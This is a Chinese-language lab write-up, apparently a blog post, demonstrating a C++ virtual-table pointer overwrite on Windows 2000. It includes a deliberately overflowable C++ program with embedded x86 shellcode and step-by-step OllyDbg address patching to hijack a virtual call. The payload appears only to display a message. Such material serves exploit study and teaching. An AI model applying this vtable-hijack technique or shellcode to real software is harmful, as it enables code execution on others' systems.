---
layout:		post
title:		攻击C++的虚函数
author:		wooy0ung
tags:		windows
category:  	exploit
---


>[分析环境]  
>系统: Windows 2000 Professional sp4  
>编译器: Visual C++ 6.0  
>调试器: OllyDbg 1.10  
<!-- more -->


### 0x00 前期准备

VC 6.0新建一个工程, 贴入以下代码, 选择release版本

```
#include <windows.h>
#include <iostream>
using namespace std;

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"
"\x90\x90\x90\x90";		# 通过调试确定shellcode的首地址, 被覆盖的虚表指针会指向这里

class myClass
{
public:
	char buf[200];
	virtual void test()
	{
		cout<<"Class Vtable::test()"<<endl;
	}
};

myClass overflow, *p;

int main()
{
	char *p_vtable;
	p_vtable=overflow.buf-4;
	printf("addr: 0x%08x\n",p_vtable);
	__asm int 3;
	
	p_vtable[0]=0xcc;
	p_vtable[1]=0x88;
	p_vtable[2]=0x40;
	p_vtable[3]=0x00;
	strcpy(overflow.buf, shellcode);

	p=&overflow;
	p->test();

	return 0;
}
```


### 0x01 exploit

运行*.exe, 弹出异常框, 选择取消自动调用OllyDbg附加调试, 虚表指针已经打印出来

![](/assets/img/exploit/2017-10-02-windows-2000-vtable/0x00.png)

单步到rep movsd, 内存区goto 0x00410dd8, 可以看到copy过去的数据

![](/assets/img/exploit/2017-10-02-windows-2000-vtable/0x01.png)
![](/assets/img/exploit/2017-10-02-windows-2000-vtable/0x02.png)

数据起始-4 byte(0x004088cc)是虚表指针, 将它修改为指向数据尾部的90909090(0x00410e5c)

![](/assets/img/exploit/2017-10-02-windows-2000-vtable/0x03.png)

同时将尾部90909090修改成指向shellcode的起始地址(0x00410ddc)

![](/assets/img/exploit/2017-10-02-windows-2000-vtable/0x04.png)

源码作如下修改

```
p_vtable[0]=0x5c;
p_vtable[1]=0x0e;
p_vtable[2]=0x41;
p_vtable[3]=0x00;
```

shellcode最后的4 byte修改成0x00410ddc

```
"\xdc\x0d\x41\x00"
```

注释掉int 3断点,再编译运行一遍, pwn~

![](/assets/img/exploit/2017-10-02-windows-2000-vtable/0x05.png)